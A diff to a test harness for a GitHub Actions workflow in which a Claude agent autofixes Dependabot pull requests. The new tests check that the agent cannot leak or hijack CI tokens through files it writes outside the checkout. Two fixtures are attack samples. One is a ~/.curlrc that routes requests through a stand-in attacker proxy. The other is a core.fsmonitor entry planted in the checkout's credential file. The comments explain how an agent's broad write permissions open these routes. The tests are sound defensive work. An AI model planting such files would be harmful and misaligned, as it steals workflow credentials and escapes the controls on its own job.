@@ -28,12 +28,11 @@ import { startGitServer, tokenOf, basicFor } from './lib/git-http-server.mjs';
  * every `if:`, every output, every `run:` block through bash as GitHub runs
  * it). The pushes go through real `git` to a real `git http-backend` behind a
  * local server that records each request's Authorization, which is the thing
- * GitHub attributes a push to. The working tree carries GITHUB_TOKEN exactly
- * where the real job leaves it, twice:
- *   - actions/checkout v7 keeps its header in an included file under
- *     RUNNER_TEMP (which claude-code-action v1.0.187 does not remove), and
- *   - claude-code-action rewrites `origin` to embed the job's github_token
- *     (src/github/operations/git-config.ts).
+ * GitHub attributes a push to. The working tree carries GITHUB_TOKEN where the
+ * real job leaves it: claude-code-action rewrites `origin` to embed the job's
+ * github_token (src/github/operations/git-config.ts), and a checkout that
+ * persists its credential keeps a header in an included file under
+ * RUNNER_TEMP (which claude-code-action v1.0.187 does not remove).
  * So "the App pushed" is observed at the remote, not inferred from argv.
  * Only the agent and the two token endpoints are simulated: the agent writes
  * the files a test names, and a `curl` stub answers the OIDC request and the
@@ -124,6 +123,13 @@ if [ -n "$expr" ]; then printf '%s' "$doc" | jq -r "$expr"; else printf '%s\\n' 
 // revoke. Every call is logged with the step that made it ($GITHUB_ACTION),
 // so a test can say which step asked for a token, and when.
 const CURL_STUB = `#!/usr/bin/env bash
+# curl reads ~/.curlrc (or $CURL_HOME/.curlrc) unless -q is its FIRST argument.
+# One that names a proxy sends the request, credentials and all, there.
+if [ "\${1:-}" != -q ] && grep -qs '^proxy' "\${CURL_HOME:-$HOME}/.curlrc"; then
+  printf '%s\\tDIVERTED\\t%s\\t\\t\\n' "\${GITHUB_ACTION:-}" "$*" >> "$CURL_LOG"
+  exit 7
+fi
+[ "\${1:-}" = -q ] && shift
 method=GET; url=''; auth=''; ctype=''; body=''
 while [ $# -gt 0 ]; do
   case "$1" in
@@ -186,16 +192,21 @@ const IN_BOUNDS_FIX = { 'src/client.ts': 'export const timeout = 2000;\n' };
  *            was installed: the PR head lacks the autofix prompt and bounds
  *   workflowSha  the commit the workflow runs from, when not the seeded one
  *   runnerTemp  a runner temp directory to reuse, as a self-hosted runner can
+ *   outsideWrites  files the agent writes outside the checkout, keyed by a
+ *            path relative to HOME or RUNNER_TEMP ('~/x', '$RUNNER_TEMP/x').
+ *            A bare Write or Edit allow rule matches every path but Claude
+ *            Code's protected ones, so the agent can.
  */
-async function runAutofix({ edits = IN_BOUNDS_FIX, commits = [DEPENDABOT_COMMIT], labels = [], exchange = 'ok', refuse = [], refuseWith = 403, helper = false, jobs = JOBS, pipelineOnBranch = true, workflowSha, runnerTemp: sharedTemp } = {}) {
+async function runAutofix({ edits = IN_BOUNDS_FIX, commits = [DEPENDABOT_COMMIT], labels = [], exchange = 'ok', refuse = [], refuseWith = 403, helper = false, jobs = JOBS, pipelineOnBranch = true, workflowSha, runnerTemp: sharedTemp, outsideWrites = {} } = {}) {
   const root = mkdtempSync(join(tmpdir(), 'ds-autofix-'));
   const srv = join(root, 'srv');
   const bare = join(srv, 'octocat', 'repo.git');
   const work = join(root, 'work');
   const bin = join(root, 'bin');
   const runnerTemp = sharedTemp ?? join(root, 'runner-temp');
+  const home = join(root, 'home');
   const commentsDir = join(root, 'comments');
-  for (const d of [srv, work, bin, runnerTemp, commentsDir, join(work, 'src'), join(work, '.github/dependabot-automerge')]) {
+  for (const d of [srv, work, bin, runnerTemp, home, commentsDir, join(work, 'src'), join(work, '.github/dependabot-automerge')]) {
     mkdirSync(d, { recursive: true });
   }
 
@@ -222,23 +233,26 @@ async function runAutofix({ edits = IN_BOUNDS_FIX, commits = [DEPENDABOT_COMMIT]
 
   const server = await startGitServer(srv, { refuse, refuseWith });
   try {
-    // What actions/checkout v7 leaves behind: an origin with no credential in
-    // it, and GITHUB_TOKEN as an extraheader in a RUNNER_TEMP file the repo's
-    // config includes.
     git(['remote', 'add', 'origin', `${server.url}/octocat/repo.git`], work);
     const creds = join(runnerTemp, 'git-credentials-0b1f.config');
-    git(['config', '--file', creds, `http.${server.url}/.extraheader`, `AUTHORIZATION: ${basicFor(WORKFLOW_TOKEN)}`]);
-    git(['config', '--local', `includeIf.gitdir:${realpathSync(work)}/.git.path`, creds], work);
-    assert.equal(
-      git(['config', '--get-all', `http.${server.url}/.extraheader`], work).trim(),
-      `AUTHORIZATION: ${basicFor(WORKFLOW_TOKEN)}`,
-      'harness: the checkout credential must be live in the working tree, or the identity tests are vacuous',
-    );
 
     const calls = { fixer: [] };
     const uses = {
-      // The tree above already is the checkout.
-      'actions/checkout': async () => ({ exitCode: 0 }),
+      // The tree above already is the checkout. What actions/checkout v7 adds
+      // unless told not to persist credentials: GITHUB_TOKEN as an
+      // extraheader in a RUNNER_TEMP file the repo's config includes.
+      'actions/checkout': async ({ with: w }) => {
+        if (w['persist-credentials'] !== 'false') {
+          git(['config', '--file', creds, `http.${server.url}/.extraheader`, `AUTHORIZATION: ${basicFor(WORKFLOW_TOKEN)}`]);
+          git(['config', '--local', `includeIf.gitdir:${realpathSync(work)}/.git.path`, creds], work);
+          assert.equal(
+            git(['config', '--get-all', `http.${server.url}/.extraheader`], work).trim(),
+            `AUTHORIZATION: ${basicFor(WORKFLOW_TOKEN)}`,
+            'harness: the checkout credential must be live in the working tree',
+          );
+        }
+        return { exitCode: 0 };
+      },
       'anthropics/claude-code-action': async ({ with: w }) => {
         calls.fixer.push({ ...w });
         // Agent mode, before the agent runs (git-config.ts): its commit
@@ -258,6 +272,11 @@ async function runAutofix({ edits = IN_BOUNDS_FIX, commits = [DEPENDABOT_COMMIT]
         for (const [path, content] of Object.entries(edits)) {
           mkdirSync(dirname(join(work, path)), { recursive: true });
           writeFileSync(join(work, path), content);
+        }
+        for (const [path, content] of Object.entries(outsideWrites)) {
+          const abs = path.replace(/^~\//, `${home}/`).replace(/^\$RUNNER_TEMP\//, `${runnerTemp}/`);
+          mkdirSync(dirname(abs), { recursive: true });
+          writeFileSync(abs, content, { mode: 0o755 });
         }
         return { exitCode: 0, outputs: { execution_file: '' } };
       },
@@ -309,6 +328,7 @@ async function runAutofix({ edits = IN_BOUNDS_FIX, commits = [DEPENDABOT_COMMIT]
         PR_LABELS_JSON: JSON.stringify({ labels: labels.map((name) => ({ name })) }),
         BUMP_PATHS: 'package.json',
         RUNNER_TEMP: runnerTemp,
+        HOME: home,
         // A workflow_run job runs the default branch's workflow at its latest
         // commit. Here that is the seeded commit, which holds the pipeline.
         GITHUB_SHA: workflowSha ?? baseSha,
@@ -437,6 +457,49 @@ test('when every push is refused, nothing lands and a person is told once', asyn
   assert.equal(r.comments.length, 1, r.log);
   assert.match(r.comments[0], /could not push/i);
   assert.ok(labelledAndAssigned(r.ghCalls), `the escalation must label and assign:\n${r.ghCalls.join('\n')}`);
+});
+
+test('a checkout that persists its credential still cannot make the push a GITHUB_TOKEN push', async () => {
+  // The job's checkout does not persist it; the push step resets that header
+  // anyway, so a workflow edit that brings it back does not bring #2693 back.
+  const persisted = structuredClone(JOBS);
+  for (const step of persisted.autofix.steps) {
+    if (step.uses?.startsWith('actions/checkout')) delete step.with['persist-credentials'];
+  }
+  const r = await runAutofix({ jobs: persisted });
+  assert.deepEqual(r.pushedAs, [CLAUDE_APP_TOKEN], r.log);
+  assert.equal(r.failed, false, r.log);
+});
+
+// ---- what the agent writes outside the checkout -----------------------------
+//
+// The fixer's Edit and Write allow rules name no path, and a rule with no path
+// matches every path except Claude Code's protected ones (.git, .claude, shell
+// rc files, ...). So the agent can write to its home directory and to
+// RUNNER_TEMP. Nothing it writes there may steer a later step.
+
+test('a curlrc the agent wrote cannot steer the push step\'s token requests', async () => {
+  // curl reads ~/.curlrc unless -q comes first. One naming a proxy would hand
+  // the proxy this job's OIDC request token, its OIDC token and the Claude
+  // App token.
+  const r = await runAutofix({ outsideWrites: { '~/.curlrc': 'proxy = "http://attacker.invalid:8080"\ninsecure\n' } });
+  assert.deepEqual(r.tokenCalls.filter((c) => c.method === 'DIVERTED').map((c) => c.url), [], r.log);
+  assert.deepEqual(r.pushedAs, [CLAUDE_APP_TOKEN], r.log);
+  assert.equal(r.failed, false, r.log);
+});
+
+test('the agent cannot plant git config through checkout\'s credential file', async () => {
+  // A persisted checkout credential is a RUNNER_TEMP file the repo's git
+  // config includes. Written by the agent, a `core.fsmonitor` in it would run
+  // a program on the bounds step's `git add`, with GITHUB_TOKEN and this
+  // job's OIDC token in its environment.
+  const dir = mkdtempSync(join(tmpdir(), 'ds-fsmon-'));
+  const ran = join(dir, 'ran');
+  const program = join(dir, 'fsmonitor');
+  writeFileSync(program, `#!/bin/sh\necho ran > ${JSON.stringify(ran)}\n`, { mode: 0o755 });
+  const r = await runAutofix({ outsideWrites: { '$RUNNER_TEMP/git-credentials-0b1f.config': `[core]\n\tfsmonitor = ${program}\n` } });
+  assert.ok(!existsSync(ran), `a program the agent named in git config ran:\n${r.log}`);
+  assert.deepEqual(r.pushedAs, [CLAUDE_APP_TOKEN], r.log);
 });
 
 // ---- when a token exists at all --------------------------------------------
